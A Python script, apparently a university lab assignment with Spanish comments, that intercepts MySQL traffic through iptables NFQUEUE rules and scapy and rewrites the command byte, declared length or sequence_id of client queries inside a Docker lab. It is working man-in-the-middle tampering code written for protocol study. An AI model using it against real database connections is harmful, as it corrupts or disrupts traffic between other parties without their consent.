#!/usr/bin/env python3
"""
mitm_nfqueue.py — Estrategia A: intercepta y MODIFICA tráfico MySQL vía NFQUEUE
(Tarea 3, spec §2).

Implementa las 3 modificaciones de campos del protocolo que pide la tarea,
direccionando los bytes del header MySQL por POSICIÓN (no por búsqueda de texto):

    [3 bytes largo] [1 byte sequence_id] [1 byte comando] [cuerpo...]

Modo activo seleccionable con la constante MODO (una modificación por vez, para
poder fundamentar cada una por separado en el informe y correlacionar el video
con el campo modificado).

Requiere que el tráfico al puerto 3306 esté redirigido a la cola con:
    iptables -A OUTPUT -p tcp --dport 3306 -j NFQUEUE --queue-num 1
    iptables -A INPUT  -p tcp --sport 3306 -j NFQUEUE --queue-num 1

Este contenedor debe compartir la netns del cliente
(network_mode: "service:cliente" en docker-compose.yml).

NOTA (spec §2, error 3): modificar el largo declarado sin ajustar seq/ack de TCP
puede producir un TIMEOUT de aplicación (MySQL esperando más bytes) en vez de un
error de protocolo inmediato. Es el comportamiento ESPERADO, no un bug del
script: el stream TCP subyacente queda "sano" (checksums válidos) pero
desincronizado a nivel de aplicación.
"""
from datetime import datetime

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

# Reutiliza el parser del sniffer: único punto de verdad del formato MySQL.
from sniffer import parsear_mysql_header, COM_QUERY


# ─── CONFIGURACIÓN: qué modificación aplicar (una por vez) ───────────────────
#   "comando"     -> cambia el byte de comando 0x03 (COM_QUERY) por 0x02 (COM_INIT_DB)
#   "largo"       -> infla el largo declarado en +50 bytes sin agregar cuerpo real
#   "sequence_id" -> desplaza el sequence_id en +5 (rompe el orden esperado)
#   None          -> solo observar, no modificar
MODO = "sequence_id"

LOG_PATH = "/scripts/log_mitm.txt"


def _log(msg: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    linea = f"{ts} | {msg}"
    print(linea)
    with open(LOG_PATH, "a") as f:
        f.write(linea + "\n")


def procesar(pkt):
    ip = IP(pkt.get_payload())

    if ip.haslayer(Raw):
        payload = bytes(ip[Raw].load)
        parsed = parsear_mysql_header(payload)
        if parsed is not None:
            largo, seq_id, comando, resto = parsed
            nuevo_payload = None

            # Solo actuamos sobre COM_QUERY (0x03), es decir queries del cliente.
            if MODO == "comando" and comando == COM_QUERY:
                # 0x03 (COM_QUERY) -> 0x02 (COM_INIT_DB): el servidor interpreta
                # el texto de la query como nombre de base de datos.
                nuevo_payload = payload[:4] + bytes([0x02]) + resto
                _log(f"[MOD comando] 0x03 -> 0x02 | seq={seq_id} | query={resto[:40]!r}")

            elif MODO == "largo" and comando == COM_QUERY:
                # Declara 50 bytes más de los que realmente van en el cuerpo.
                nuevo_largo = (largo + 50).to_bytes(3, "little")
                nuevo_payload = nuevo_largo + payload[3:]
                _log(f"[MOD largo] {largo} -> {largo + 50} | seq={seq_id}")

            elif MODO == "sequence_id" and comando == COM_QUERY:
                nuevo_seq = bytes([(seq_id + 5) % 256])
                nuevo_payload = payload[:3] + nuevo_seq + payload[4:]
                _log(f"[MOD sequence_id] {seq_id} -> {(seq_id + 5) % 256}")

            if nuevo_payload is not None:
                ip[Raw].load = nuevo_payload
                # Forzar recálculo de largo IP y checksums IP/TCP al modificar.
                # (No toca seq/ack TCP: ver NOTA del docstring.)
                del ip[IP].len, ip[IP].chksum, ip[TCP].chksum
                pkt.set_payload(bytes(ip))
                pkt.accept()
                return

    # accept() deja pasar el paquete sin modificar.
    pkt.accept()


def main():
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, procesar)  # 1 = --queue-num usado en las reglas iptables
    _log(f"[*] Interceptando MySQL en NFQUEUE #1 | MODO={MODO} | Ctrl-C para salir.")
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[*] Fin.")
    finally:
        nfqueue.unbind()


if __name__ == "__main__":
    main()
